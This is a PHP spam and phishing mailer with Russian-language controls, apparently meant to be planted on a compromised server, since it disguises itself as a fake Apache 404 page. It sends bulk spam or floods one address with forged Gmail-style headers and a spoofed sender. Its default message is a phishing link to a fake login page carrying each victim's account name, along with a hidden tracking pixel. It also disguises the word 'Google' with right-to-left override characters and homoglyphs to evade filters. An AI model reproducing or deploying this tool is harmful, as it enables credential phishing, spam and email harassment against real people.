<?php
header('Content-Type: text/html; charset=utf-8');
if (!$_REQUEST['mail']) {
	header("HTTP/1.1 404 Not Found");
	die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL '.basename(__FILE__).' was not found on this server.</p><p>Additionally, a 404 Not Founderror was encountered while trying to use an ErrorDocument to handle the request.</p><hr><address>Apache/2 Server at '.$_SERVER['SERVER_NAME'].' Port 80</address></body></html>');
}?>
<title>Sender Anonym Email :: FLoodeR :: SpameR</title>
<meta content='text/html; charset=Windows-1251' http-equiv='Content-Type'>
<meta name="robots" content="none"/>
<?php
error_reporting(0);

if (!set_time_limit(0)) {
	$limit = false;
}
else {
	set_time_limit(0);
	ignore_user_abort(1);
	$limit = true;
}

ini_set('max_execution_time', '0');
?>
set_time_limit(0) = <?php

if ($limit) echo ('<font color=Green>On</font>');
else echo ('<font color=Red>Off</font> (Время работы ограничено текущими настройками сервера)'); ?><br />
<?php
$ip = getenv('REMOTE_ADDR');
if ($_GET['mail'] == '1' || $_GET['mail'] == '2' || $_GET['mail'] == '3') {
	$to = $_POST['to'] = stripslashes($_POST['to']);
	$text = $_POST['msg'] = stripslashes($_POST['msg']);
	$from = $_POST['from'] = $_POST['from'];
	$from1 = $_POST['from1'] = $_POST['from1'];
	$subject = $_POST['subject'] = $_POST['subject'];
	//$from1 = '=?koi8-r?B?' . base64_encode(convert_cyr_string($from1, "w", "k")) . '?=';
	//$subject = '=?koi8-r?B?' . base64_encode(convert_cyr_string($subject, "w", "k")) . '?=';
	$message = str_replace("%link%", $_POST['link'], $_POST['msg']);
	$pro = " ";
	if ($_POST['to'] && $_POST['msg']) {
	//var_dump($_POST);die();

		$headers = "MIME-Version: 1.0\r\n";
		$headers.= "Content-type: text/html; charset=windows-1251\r\n";
		$headers.= "From:$from1 $pro $from \n";
		if ($_GET['mail'] == '1') {
			multipart_mail($from, $from1, $to, $subject, $text) or die('Не возможно отправить сообщение');
		}
		elseif ($_GET['mail'] == '2') {
			$rec = explode("\n", $_POST['to']);
			for ($i = 0; $i < count($rec); $i++) {
				$rec[$i] = trim($rec[$i]);
				$username = $rec[$i];
				$emailArr = explode("@", $username);
				//if(strtolower($emailArr[1]) == "gmail.com") {
					$username = $emailArr[0];
				//}

				echo "<b>" . $rec[$i] . "</b></br>" . PHP_EOL;
				$readyMessage = str_replace("google.com", google_encode("google.com"), $message);
				$readyMessage = str_replace("Google", google_encode("Google"), $readyMessage);
				$readyMessage = str_replace("google", google_encode("google"), $readyMessage);
				//$readyMessage = str_replace("%mail%", $username, $readyMessage);
				
				$readyMessage = str_replace("%value%", $username, $readyMessage);
				multipart_mail($from, $from1, $rec[$i], $subject, $readyMessage) or die('Не возможно отправить сообщение');
				sleep(1);
			}
		}
		elseif ($_GET['mail'] == '3') {
			if (preg_match('/[0-9]+/', $_POST['kol'])) {
				for ($i = 0; $i < $_POST['kol']; $i++) {
					multipart_mail($from, $from1, $to, $subject, $text) or die('Не возможно отправить сообщение');
					sleep(1);
				}
			}
			else {
				echo ('Неверно введено (или не введено) кол-во сообщений');
			}
		}
		echo ('<center><b><font color="green">Сообщение успешно отправлено</font></b></center>');
	}
	else {
?>
<form style="width:800px" method='post'>

<?php
		if ($_GET['mail'] == '1' || $_GET['mail'] == '3') {
			echo ("<label><span>Получатель:</span>&nbsp;<input type='text'name='to'></label><br /><br />");
		}

?>

<table>
	<tr>
		<td><label><span>Имя:</span><input type='text' name='from1' value='Елена Тирова '></label></td>
		<td><label><span>Мыло:</span><input type='text' size="50" name='from' value='<1804099@gmail.com>'></label></td>
	</tr>
	<tr>
		<td><label><span>Тема сообщения:</span><br><input type='text' size="50" name='subject' value='документы'></label></td>
		<td><label><span>Ссылка:</span><br><input type='text' name='link' size="50" value='<?=generateDomain(mt_rand(8,15))?>.info'></label></td>
	</tr>
</table>

<?php
		if ($_GET['mail'] == '3') {
			echo ("<label>Кол-во сообщений: <input type='text' name='kol'></label><br />");
		}

?>
<?php
		if ($_GET['mail'] == '2') {
			echo ("<br /><label>Получатели:<br /><textarea name='to' rows='3' cols='30'>ynctbIc@gmail.com</textarea></label>");
		}

?><br />
<label>Сообщение:<br />
<textarea name='msg' rows='18' cols='80'><br>
<br>
<br>
<a href="http://%link%/login/auth.php/?account=%value%" style="display:block; margin: 30px 0 0 0;border-top: 1px dotted #d8d8d8; padding: 15px 0 0 0;"><img style="margin:0 0 0 -4px; padding: 0;" src="http://%link%/img/rrr.jpg#NAN#" height="130" width="188px"></a>


<div style="opacity:0">
<img src="http://%link%/who.php/?test=%value%@Rek#NAN#" height="1px" width="1px"></div>
</textarea></label>
<br />
<label>
	<input name="plaintextauto" type="checkbox" checked/>
	Автогенерация текстовой версии
</label>
<br>
<label>Текстовая версия письма (text/plain):<br />
<textarea name='plaintext' rows='1' cols='80'></textarea>
</label>
<br /><br />
<input type='submit'>
</form>
<?php
	}
}
else {
?><br />
<a href='<?php echo $_SERVER['PHP_SELF'] ?>?mail=1'>Отправить простое сообщение</a><br />
<a href='<?php echo $_SERVER['PHP_SELF'] ?>?mail=2'>Наспамить</a><br />
<a href='<?php echo $_SERVER['PHP_SELF'] ?>?mail=3'>Нафлудить</a><br />
<?php
}
?>
<B STYLE="DISPLAY: NONE;"> 
<?php
function multipart_mail($from, $from1, $to, $subject, $text, $cc = null)
{
	$headers = "MIME-Version: 1.0\r\n";
	$headers.= "References: <".generateDomain(36)."=GwFN9gs7Z_8oZw@mail.gmail.com> <".generateDomain(43)."+hU59BYg@mail.gmail.com> <".generateDomain(13)."-uq4_4G2E64NX9G6grn0cEeO0L=".generateDomain(11)."@mail.gmail.com>\n";

	
    $headers.= "x-mcda: TRUE\n";
	//
	$xfrom = str_replace(array('<','>'), '', $from);
	$headers.= "From: =?UTF-8?B?"  . base64_encode($from1) . "?= <". $xfrom .">\n";
	if (!is_null($cc)) {
		$headers.= "Cc: $cc\n";
	}

	$headers.= "Date: " . date("r") . "\n";
	$headers.= "Return-Path: $from\n";
	$headers.= "Precedence: bulk\n";



	$headers.= "MIME-Version: 1.0\n";
	$baseboundary = strtoupper(md5(uniqid(rand() , true)));
	$newboundary = strtoupper(md5(uniqid(rand() , true)));
	$headers.= 'Content-Type: multipart/alternative; boundary="'.$baseboundary.'"'."\n";
	$message = "--$baseboundary\n";
	$message.= 'Content-Type: text/plain; charset="UTF-8"'."\n";
	$message.= "Content-Transfer-Encoding: base64\n";
	$message.= "\n";
	if($_POST['plaintextauto'] != 'on') {
		$text_plain = $_POST['plaintext'];
	} else {
		$text_plain = $text;
	}
	$text_plain = str_replace('<p>', "\n", $text_plain);
	$text_plain = str_replace('<b>', "", $text_plain);
	$text_plain = str_replace('</b>', "", $text_plain);
	$text_plain = str_replace('<br />', "\n", $text_plain);
	$text_plain = strip_tags($text_plain);
	$text_plain = str_replace("&nbsp;", "", $text_plain);
	$message.= base64_encode($text_plain); //Если раскоментить то кодированные символы будут ломать письмо.
	$message.= "\n";
	$message.= "--$baseboundary\n";
	$message.= 'Content-Type: text/html; charset="UTF-8"'."\n";
	$message.= "Content-Transfer-Encoding: base64\n\n";
	$message.= base64_encode($text) . "\n\n";
	$message.= "--$baseboundary--\n";
	return mail($to, "=?UTF-8?B?"  . base64_encode($subject) . "?=", $message, $headers);
}

function base64url_encode( $data ){
  return rtrim( strtr( base64_encode( $data ), '+/', '-_'), '=');
}
function google_encode( $data, $flag=FALSE ){
	if($flag){
		return "&#x202E;".str_replace('o','&#959;',strrev($data));
	} else 
		return "<div style='display:inline-block;text-decoration: inherit;'>&#x202E;".str_replace('o','&#959;',strrev($data))."<vid\></div>";
}

function generateDomain($length = 8){
	$chars = 'qwertyuiopasdfghjklzxcvbnm';
	$numChars = strlen($chars);
	$string = '';
	for ($i = 0; $i < $length; $i++) {
		$string .= substr($chars, rand(1, $numChars) - 1, 1);
	}
	return $string;
}